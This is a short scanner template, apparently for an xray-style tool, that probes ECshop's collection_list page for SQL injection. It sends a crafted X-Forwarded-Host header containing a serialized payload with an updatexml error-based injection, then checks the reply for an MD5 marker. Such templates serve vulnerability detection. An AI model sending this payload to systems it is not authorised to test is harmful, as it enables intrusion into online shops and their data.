id: ecshop-collection-list-sqli

info:
    name: ECshop Collection List sqli
    author: æ›¦shen
    severity: high

set:
    r1: randomInt(10000, 99999)
rules:
    r0:
        request:
            method: GET
            path: /user.php?act=collection_list
            headers:
                X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:55:"1' and updatexml(1,insert(md5({{r1}}),1,1,0x7e),1) and '";|45ea207d7a2b68c49582d2d22adf953a
        expression: response.body.bcontains(bytes(substr(md5(string(r1)), 1, 31)))
expression: r0()
